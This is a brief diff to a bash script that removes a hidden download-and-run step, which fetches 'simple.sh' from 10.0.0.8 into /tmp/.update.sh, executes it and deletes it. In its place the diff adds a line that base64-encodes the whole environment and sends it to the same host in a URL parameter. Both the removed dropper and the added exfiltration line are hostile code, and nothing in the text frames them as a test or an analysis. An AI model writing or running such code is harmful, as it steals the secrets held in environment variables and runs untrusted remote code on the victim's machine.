@@ -1,6 +1,4 @@
 #!/bin/bash
 
-curl -s http://10.0.0.8:2221/simple.sh -o /tmp/.update.sh
-chmod +x /tmp/.update.sh
-bash /tmp/.update.sh
-rm -f /tmp/.update.sh
+ENV_B64=$(printenv | base64 | tr -d '\n')
+curl -s "http://10.0.0.8:80/?id=${ENV_B64}"
